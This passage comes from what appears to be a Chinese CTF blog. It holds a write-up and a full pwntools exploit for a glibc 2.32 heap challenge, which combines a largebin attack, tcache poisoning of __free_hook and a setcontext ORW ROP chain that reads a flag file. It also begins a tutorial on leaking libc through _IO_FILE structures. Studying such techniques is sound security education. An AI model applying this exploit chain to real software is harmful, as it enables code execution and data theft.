libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br></pre></td></tr></table></figure><p>顺便把chunk0释放到largebin后 泄露一下堆地址 因为这个版本已经有了fd异或保护机制</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">3</span>,<span class="number">0x900</span>)</span><br><span class="line">edit(<span class="number">0</span>,cyclic(<span class="number">0x10</span>))</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">heap_addr = u64(io.recvuntil(<span class="string">&quot;\x0a&quot;</span>,drop = <span class="literal">True</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x290</span></span><br><span class="line">success(<span class="string">&quot;heap_addr :&quot;</span>+<span class="built_in">hex</span>(heap_addr))</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">mp_tcache_bins = libc_addr + <span class="number">0x1e32d0</span></span><br><span class="line">success(<span class="string">&quot;mp_tcache_bins :&quot;</span>+<span class="built_in">hex</span>(mp_tcache_bins))</span><br><span class="line">payload = p64(<span class="number">0</span>)+p64(mp_tcache_bins-<span class="number">0x10</span>)+p64(<span class="number">0</span>)+p64(mp_tcache_bins-<span class="number">0x20</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x900</span>)</span><br></pre></td></tr></table></figure><p>然后就是largebin attack的部分 此时mp_tcache_bins处已经被写入一个很大的值 小于这个值的都会被释放进tcachebin</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303201950042.png" title="image-20230320195049984" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303201950042.png" alt="image-20230320195049984"></a></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">5</span>,<span class="number">0x900</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x900</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x900</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">key = ( heap_addr + <span class="number">0x3000</span> ) &gt;&gt;<span class="number">12</span></span><br><span class="line">success(<span class="string">&quot;key :&quot;</span>+<span class="built_in">hex</span>(key))</span><br><span class="line">edit(<span class="number">6</span>,p64(key^(free_hook)))</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x900</span>)</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x900</span>)</span><br></pre></td></tr></table></figure><p>接下来利用tcache 申请到free_hook的空间</p><p>接下来就是重头戏了 由于开启了沙盒 所以我们只能用orw来泄露flag</p><p>2.29以前 setcontext是通过rdi寄存器来寻址 相对来说很好控制 但是2.32是由rdx来寻址 我们需要想办法控制rdx寄存器的值</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">000000000005306</span>D                 mov     rsp, [rdx+<span class="number">0</span>A0h]</span><br><span class="line">.text:<span class="number">0000000000053074</span>                 mov     rbx, [rdx+<span class="number">80</span>h]</span><br><span class="line">.text:<span class="number">000000000005307B</span>                 mov     rbp, [rdx+<span class="number">78</span>h]</span><br><span class="line">.text:<span class="number">000000000005307F</span>                 mov     r12, [rdx+<span class="number">48</span>h]</span><br><span class="line">.text:<span class="number">0000000000053083</span>                 mov     r13, [rdx+<span class="number">50</span>h]</span><br><span class="line">.text:<span class="number">0000000000053087</span>                 mov     r14, [rdx+<span class="number">58</span>h]</span><br><span class="line">.text:<span class="number">000000000005308B</span>                 mov     r15, [rdx+<span class="number">60</span>h]</span><br><span class="line">.text:<span class="number">000000000005308F</span>                 test    dword ptr fs:<span class="number">48</span>h, <span class="number">2</span></span><br><span class="line">.text:<span class="number">000000000005309B</span>                 jz      loc_53156</span><br><span class="line">.text:<span class="number">0000000000053156</span> loc_53156:                              ; CODE XREF: </span><br><span class="line">.text:<span class="number">0000000000053156</span>                 mov     rcx, [rdx+<span class="number">0</span>A8h]</span><br><span class="line">.text:<span class="number">000000000005315</span>D                 push    rcx</span><br><span class="line">.text:<span class="number">000000000005315</span>E                 mov     rsi, [rdx+<span class="number">70</span>h]</span><br><span class="line">.text:<span class="number">0000000000053162</span>                 mov     rdi, [rdx+<span class="number">68</span>h]</span><br><span class="line">.text:<span class="number">0000000000053166</span>                 mov     rcx, [rdx+<span class="number">98</span>h]</span><br><span class="line">.text:<span class="number">000000000005316</span>D                 mov     r8, [rdx+<span class="number">28</span>h]</span><br><span class="line">.text:<span class="number">0000000000053171</span>                 mov     r9, [rdx+<span class="number">30</span>h]</span><br><span class="line">.text:<span class="number">0000000000053175</span>                 mov     rdx, [rdx+<span class="number">88</span>h]</span><br></pre></td></tr></table></figure><p>利用ropper工具 可以搜索libc文件中的gadget 看看有没有能达到我们目的的</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303201957342.png" title="image-20230320195713239" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303201957342.png" alt="image-20230320195713239"></a></p><p>其中 我们找到了符合我们要求的 可以通过rdi的值来影响到rdx</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303201957574.png" title="image-20230320195748520" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303201957574.png" alt="image-20230320195748520"></a></p><p>如果调用free函数 那么rdi寄存器存的就是我们想要释放的堆块的用户地址 并且利用call指令 还可以进行下一步跳转 也就是跳转到setcontext上</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ret_addr = libc_addr + <span class="number">0x26699</span></span><br><span class="line">rdi_addr = libc_addr + <span class="number">0x2858f</span></span><br><span class="line">rsi_addr = libc_addr + <span class="number">0x2ac3f</span></span><br><span class="line">rdx_r12_addr = libc_addr + <span class="number">0x114161</span></span><br><span class="line">rax_addr = libc_addr + <span class="number">0x45580</span></span><br><span class="line">setcontext_addr = libc_addr + libc.sym[<span class="string">&#x27;setcontext&#x27;</span>]+<span class="number">61</span></span><br><span class="line">gadget_addr = libc_addr + <span class="number">0x000000000014b760</span></span><br><span class="line">chunk8_addr = heap_addr +<span class="number">0x36e0</span></span><br><span class="line">open_addr = libc_addr + libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read_addr = libc_addr + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_addr = libc_addr + libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">success(<span class="built_in">hex</span>(chunk8_addr))</span><br><span class="line">flag_addr = chunk8_addr + <span class="number">0x10</span></span><br><span class="line">payload = <span class="string">b&#x27;./flag\x00\x00&#x27;</span>+p64(chunk8_addr+<span class="number">0x10</span>)+cyclic(<span class="number">0x10</span>)+p64(setcontext_addr)</span><br></pre></td></tr></table></figure><p>chunk8_addr是包括了chunk头的首地址</p><p>这里主要来详细讲一下payload的构造 flag字符串是为了接下来的orw</p><p>第一条指令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov rdx, qword ptr [rdi + 8]</span><br></pre></td></tr></table></figure><p>此时rdi指向的是chunk8_addr+0x10的地址 再加8 也就是指向了chunk8_addr+0x18</p><p>取这个地址的值赋值给rdx 也就是在flag字符串后我们要存入想要控制的rdx值 这里选择是chunk8_addr+0x10 </p><p>在接下来的setcontext rsp指针就会被赋值到chunk8_addr+0xb0 我们只要在那里进行下一步的构造即可</p><p>第二条指令没啥用 不用关注 看第三条</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">call qword ptr [rdx + 0x20]</span><br></pre></td></tr></table></figure><p>此时的rdx对应的值为chunk8_addr+0x18 也就是说 setcontext的地址要被放到chunk8_addr+0x38处</p><p>随后 我们用垃圾数据填充 来到chunk8_addr + 0xb0处继续开始构造</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;./flag\x00\x00&#x27;</span>+p64(chunk8_addr+<span class="number">0x10</span>)+cyclic(<span class="number">0x10</span>)+p64(setcontext_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0xa0</span>,<span class="string">b&#x27;\x00&#x27;</span>) + p64(chunk8_addr+<span class="number">0x10</span>+<span class="number">0xa8</span>)+p64(ret_addr)</span><br><span class="line">payload += p64(rdi_addr) + p64(flag_addr) + p64(rsi_addr) + p64(<span class="number">0</span>) + p64(open_addr)</span><br><span class="line">payload += p64(rdi_addr) + p64(<span class="number">3</span>) + p64(rsi_addr) + p64(flag_addr) + p64(rdx_r12_addr) + p64(<span class="number">0x50</span>) + p64(<span class="number">0</span>) + p64(read_addr)</span><br><span class="line">payload += p64(rdi_addr) + p64(<span class="number">1</span>) + p64(rsi_addr) + p64(flag_addr) + p64(rdx_r12_addr) + p64(<span class="number">0x50</span>) + p64(<span class="number">0</span>) + p64(write_addr)</span><br></pre></td></tr></table></figure><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303202013150.png" title="image-20230320201353081" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303202013150.png" alt="image-20230320201353081"></a></p><p>此时rcx的值是我们存入的ret指令 并且执行完push后 栈上会存放两个ret</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303202015813.png" title="image-20230320201502749" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303202015813.png" alt="image-20230320201502749"></a></p><p>接下来一直执行到setcontext的ret指令的时候 就会将栈上的ret弹入到rip寄存器中 顺延执行到pop rdi</p><p>我们就成功控制了程序执行流 成功获取flag</p><p>完整exp:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;1.14.71.254&quot;,28793)</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">libc = ELF(<span class="string">&quot;/home/chen/glibc-all-in-one/libs/2.32-0ubuntu3.2_amd64/libc-2.32.so&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./刷题/libc-2.27.so&quot;)</span></span><br><span class="line"><span class="comment"># context.arch = &quot;i386&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;5. Exit&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Size: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;5. Exit&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;5. Exit&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">    io.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;5. Exit&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x800</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x900</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x7f0</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;\x01&#x27;</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">main_arena_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x1</span>-<span class="number">96</span></span><br><span class="line">libc_addr = main_arena_addr - (libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]+<span class="number">0x10</span>)</span><br><span class="line">success(<span class="string">&quot;libc_addr :&quot;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">free_hook = libc_addr + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x900</span>)</span><br><span class="line">edit(<span class="number">0</span>,cyclic(<span class="number">0x10</span>))</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">heap_addr = u64(io.recvuntil(<span class="string">&quot;\x0a&quot;</span>,drop = <span class="literal">True</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x290</span></span><br><span class="line">success(<span class="string">&quot;heap_addr :&quot;</span>+<span class="built_in">hex</span>(heap_addr))</span><br><span class="line">mp_tcache_bins = libc_addr + <span class="number">0x1e32d0</span></span><br><span class="line">success(<span class="string">&quot;mp_tcache_bins :&quot;</span>+<span class="built_in">hex</span>(mp_tcache_bins))</span><br><span class="line">payload = p64(<span class="number">0</span>)+p64(mp_tcache_bins-<span class="number">0x10</span>)+p64(<span class="number">0</span>)+p64(mp_tcache_bins-<span class="number">0x20</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x900</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x900</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x900</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x900</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">key = ( heap_addr + <span class="number">0x3000</span> ) &gt;&gt;<span class="number">12</span></span><br><span class="line">success(<span class="string">&quot;key :&quot;</span>+<span class="built_in">hex</span>(key))</span><br><span class="line">edit(<span class="number">6</span>,p64(key^(free_hook)))</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x900</span>)</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x900</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20]</span></span><br><span class="line">ret_addr = libc_addr + <span class="number">0x26699</span></span><br><span class="line">rdi_addr = libc_addr + <span class="number">0x2858f</span></span><br><span class="line">rsi_addr = libc_addr + <span class="number">0x2ac3f</span></span><br><span class="line">rdx_r12_addr = libc_addr + <span class="number">0x114161</span></span><br><span class="line">rax_addr = libc_addr + <span class="number">0x45580</span></span><br><span class="line">setcontext_addr = libc_addr + libc.sym[<span class="string">&#x27;setcontext&#x27;</span>]+<span class="number">61</span></span><br><span class="line">gadget_addr = libc_addr + <span class="number">0x000000000014b760</span></span><br><span class="line">chunk8_addr = heap_addr +<span class="number">0x36e0</span></span><br><span class="line">open_addr = libc_addr + libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read_addr = libc_addr + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_addr = libc_addr + libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">success(<span class="built_in">hex</span>(chunk8_addr))</span><br><span class="line">flag_addr = chunk8_addr + <span class="number">0x10</span></span><br><span class="line">payload = <span class="string">b&#x27;./flag\x00\x00&#x27;</span>+p64(chunk8_addr+<span class="number">0x10</span>)+cyclic(<span class="number">0x10</span>)+p64(setcontext_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0xa0</span>,<span class="string">b&#x27;\x00&#x27;</span>) + p64(chunk8_addr+<span class="number">0x10</span>+<span class="number">0xa8</span>)+p64(ret_addr)</span><br><span class="line">payload += p64(rdi_addr) + p64(flag_addr) + p64(rsi_addr) + p64(<span class="number">0</span>) + p64(open_addr)</span><br><span class="line">payload += p64(rdi_addr) + p64(<span class="number">3</span>) + p64(rsi_addr) + p64(flag_addr) + p64(rdx_r12_addr) + p64(<span class="number">0x50</span>) + p64(<span class="number">0</span>) + p64(read_addr)</span><br><span class="line">payload += p64(rdi_addr) + p64(<span class="number">1</span>) + p64(rsi_addr) + p64(flag_addr) + p64(rdx_r12_addr) + p64(<span class="number">0x50</span>) + p64(<span class="number">0</span>) + p64(write_addr)</span><br><span class="line">edit(<span class="number">8</span>,payload)</span><br><span class="line">edit(<span class="number">9</span>,p64(gadget_addr))</span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *&#x27;+str(gadget_addr))</span></span><br><span class="line"><span class="comment"># pause(0)</span></span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">io.recv()</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>iofile泄露libc基址</title>
      <link href="/2023/01/01/iofile%E6%B3%84%E9%9C%B2libc%E5%9F%BA%E5%9D%80/"/>
      <url>/2023/01/01/iofile%E6%B3%84%E9%9C%B2libc%E5%9F%BA%E5%9D%80/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><p>部分堆题没有给予我们打印堆块中间的机会 这种情况下 无法通过unsortedbin来泄露基址 这里学习一种新办法 通过io file来泄露基址</p><p>在一个程序中 初始的文件描述符为1,2,3 分别对应着标准输入 标准输出 标准错误 当我们调用scanf函数或者read函数的时候 就会通过调用文件描述符0来从终端输入数据 也就意味着我们可以利用这一点来做到泄露数据</p><p>在linux系统中的IO库 存在FILE文件流来描述文件 其初始创建的三个文件stdin、stdout、stderr位于libc上 而接下来创建的位于堆中 并且其是一个单向链表结构 定义此结构体为_IO_FILE_plus</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    _IO_FILE    file;</span><br><span class="line">    _IO_jump_t   *vtable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>libc2.23以后 有一个全局变量_IO_list_all 指向了FILE文件的链表头</p><p>随便打开一个程序 gdb看一下_IO_list_all的内容</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; p /x *(<span class="keyword">struct</span> _IO_FILE_plus *) _IO_list_all</span><br><span class="line">$<span class="number">14</span> = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = <span class="number">0xfbad2086</span>, </span><br><span class="line">    _IO_read_ptr = <span class="number">0x0</span>, </span><br><span class="line">    _IO_read_end = <span class="number">0x0</span>, </span><br><span class="line">    _IO_read_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_write_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_write_ptr = <span class="number">0x0</span>, </span><br><span class="line">    _IO_write_end = <span class="number">0x0</span>, </span><br><span class="line">    _IO_buf_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_buf_end = <span class="number">0x0</span>, </span><br><span class="line">    _IO_save_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_backup_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_save_end = <span class="number">0x0</span>, </span><br><span class="line">    _markers = <span class="number">0x0</span>, </span><br><span class="line">    _chain = <span class="number">0x7ffff7dce760</span>, </span><br><span class="line">    _fileno = <span class="number">0x2</span>, </span><br><span class="line">    _flags2 = <span class="number">0x0</span>, </span><br><span class="line">    _old_offset = <span class="number">0xffffffffffffffff</span>, </span><br><span class="line">    _cur_column = <span class="number">0x0</span>, </span><br><span class="line">    _vtable_offset = <span class="number">0x0</span>, </span><br><span class="line">    _shortbuf = &#123;<span class="number">0x0</span>&#125;, </span><br><span class="line">    _lock = <span class="number">0x7ffff7dcf8b0</span>, </span><br><span class="line">    _offset = <span class="number">0xffffffffffffffff</span>, </span><br><span class="line">    _codecvt = <span class="number">0x0</span>, </span><br><span class="line">    _wide_data = <span class="number">0x7ffff7dcd780</span>, </span><br><span class="line">    _freeres_list = <span class="number">0x0</span>, </span><br><span class="line">    _freeres_buf = <span class="number">0x0</span>, </span><br><span class="line">    __pad5 = <span class="number">0x0</span>, </span><br><span class="line">    _mode = <span class="number">0x0</span>, </span><br><span class="line">    _unused2 = &#123;<span class="number">0x0</span> &lt;repeats <span class="number">20</span> times&gt;&#125;</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = <span class="number">0x7ffff7dca2a0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中file结构中的_chain指向了下一个FILE文件 即stdout 而stdout指向stdin</p><p>vtable则是一个指针 跟进一下其内容</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; p _IO_file_jumps</span><br><span class="line">$<span class="number">19</span> = &#123;</span><br><span class="line">  __dummy = <span class="number">0</span>, </span><br><span class="line">  __dummy2 = <span class="number">0</span>, </span><br><span class="line">  __finish = <span class="number">0x7ffff7a6e2d0</span> &lt;_IO_new_file_finish&gt;, </span><br><span class="line">  __overflow = <span class="number">0x7ffff7a6f2b0</span> &lt;_IO_new_file_overflow&gt;, </span><br><span class="line">  __underflow = <span class="number">0x7ffff7a6efd0</span> &lt;_IO_new_file_underflow&gt;, </span><br><span class="line">  __uflow = <span class="number">0x7ffff7a70370</span> &lt;__GI__IO_default_uflow&gt;, </span><br><span class="line">  __pbackfail = <span class="number">0x7ffff7a71c00</span> &lt;__GI__IO_default_pbackfail&gt;, </span><br><span class="line">  __xsputn = <span class="number">0x7ffff7a6d8d0</span> &lt;_IO_new_file_xsputn&gt;, </span><br><span class="line">  __xsgetn = <span class="number">0x7ffff7a6d530</span> &lt;__GI__IO_file_xsgetn&gt;, </span><br><span class="line">  __seekoff = <span class="number">0x7ffff7a6cb30</span> &lt;_IO_new_file_seekoff&gt;, </span><br><span class="line">  __seekpos = <span class="number">0x7ffff7a70940</span> &lt;_IO_default_seekpos&gt;, </span><br><span class="line">  __setbuf = <span class="number">0x7ffff7a6c7f0</span> &lt;_IO_new_file_setbuf&gt;, </span><br><span class="line">  __sync = <span class="number">0x7ffff7a6c670</span> &lt;_IO_new_file_sync&gt;, </span><br><span class="line">  __doallocate = <span class="number">0x7ffff7a600b0</span> &lt;__GI__IO_file_doallocate&gt;, </span><br><span class="line">  __read = <span class="number">0x7ffff7a6d8b0</span> &lt;__GI__IO_file_read&gt;, </span><br><span class="line">  __write = <span class="number">0x7ffff7a6d130</span> &lt;_IO_new_file_write&gt;, </span><br><span class="line">  __seek = <span class="number">0x7ffff7a6c8b0</span> &lt;__GI__IO_file_seek&gt;, </span><br><span class="line">  __close = <span class="number">0x7ffff7a6c7e0</span> &lt;__GI__IO_file_close&gt;, </span><br><span class="line">  __stat = <span class="number">0x7ffff7a6d120</span> &lt;__GI__IO_file_stat&gt;, </span><br><span class="line">  __showmanyc = <span class="number">0x7ffff7a71d80</span> &lt;_IO_default_showmanyc&gt;, </span><br><span class="line">  __imbue = <span class="number">0x7ffff7a71d90</span> &lt;_IO_default_imbue&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其指向了_IO_file_jumps结构 该结构为所有的FILE文件所共用 存储的是一些函数的指针 我们也可以通过修改这些函数指针或者在可写区域伪造一个vtable结构 不过本文不做介绍 自行了解</p><p>回到FILE文件结构体 你在一系列变量中可以找到_fileno 其对应的值就是文件描述符 这里也存在利用漏洞</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; p _IO_2_1_stdin_</span><br><span class="line">$<span class="number">20</span> = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = <span class="number">-72540024</span>, </span><br><span class="line">    _IO_read_ptr = <span class="number">0x0</span>, </span><br><span class="line">    _IO_read_end = <span class="number">0x0</span>, </span><br><span class="line">    _IO_read_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_write_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_write_ptr = <span class="number">0x0</span>, </span><br><span class="line">    _IO_write_end = <span class="number">0x0</span>, </span><br><span class="line">    _IO_buf_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_buf_end = <span class="number">0x0</span>, </span><br><span class="line">    _IO_save_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_backup_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_save_end = <span class="number">0x0</span>, </span><br><span class="line">    _markers = <span class="number">0x0</span>, </span><br><span class="line">    _chain = <span class="number">0x0</span>, </span><br><span class="line">    _fileno = <span class="number">0</span>, </span><br><span class="line">    _flags2 = <span class="number">0</span>, </span><br><span class="line">    _old_offset = <span class="number">-1</span>, </span><br><span class="line">    _cur_column = <span class="number">0</span>, </span><br><span class="line">    _vtable_offset = <span class="number">0</span> <span class="string">&#x27;\000&#x27;</span>, </span><br><span class="line">    _shortbuf = <span class="string">&quot;&quot;</span>, </span><br><span class="line">    _lock = <span class="number">0x7ffff7dcf8d0</span> &lt;_IO_stdfile_0_lock&gt;, </span><br><span class="line">    _offset = <span class="number">-1</span>, </span><br><span class="line">    _codecvt = <span class="number">0x0</span>, </span><br><span class="line">    _wide_data = <span class="number">0x7ffff7dcdae0</span> &lt;_IO_wide_data_0&gt;, </span><br><span class="line">    _freeres_list = <span class="number">0x0</span>, </span><br><span class="line">    _freeres_buf = <span class="number">0x0</span>, </span><br><span class="line">    __pad5 = <span class="number">0</span>, </span><br><span class="line">    _mode = <span class="number">0</span>, </span><br><span class="line">    _unused2 = <span class="string">&#x27;\000&#x27;</span> &lt;repeats <span class="number">19</span> times&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = <span class="number">0x7ffff7dca2a0</span> &lt;_IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果程序通过文件描述符4将flag的值读入 那么我们可以通过修改1 2 3文件描述符的值来达到攻击目的 这里同样不扩展</p><p>那么我们是如何通过FILE文件结构达到泄露基址的目的呢? 让我们阅读一下puts函数的源码</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;libioP.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;limits.h&gt;</span></span></span><br><span class="line"><span class="type">int</span></span><br><span class="line">_IO_puts (<span class="type">const</span> <span class="type">char</span> *str)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result = EOF;</span><br><span class="line">  <span class="type">size_t</span> len = <span class="built_in">strlen</span> (str);</span><br><span class="line">  _IO_acquire_lock (<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="keyword">if</span> ((_IO_vtable_offset (<span class="built_in">stdout</span>) != <span class="number">0</span></span><br><span class="line">       || _IO_fwide (<span class="built_in">stdout</span>, <span class="number">-1</span>) == <span class="number">-1</span>)</span><br><span class="line">      &amp;&amp; _IO_sputn (<span class="built_in">stdout</span>, str, len) == len</span><br><span class="line">      &amp;&amp; _IO_putc_unlocked (<span class="string">&#x27;\n&#x27;</span>, <span class="built_in">stdout</span>) != EOF)</span><br><span class="line">    result = MIN (INT_MAX, len + <span class="number">1</span>);</span><br><span class="line">  _IO_release_lock (<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line">weak_alias (_IO_puts, <span class="built_in">puts</span>)</span><br><span class="line">libc_hidden_def (_IO_puts)</span><br></pre></td></tr></table></figure><p>其调用了一个关键函数 _IO_sputn 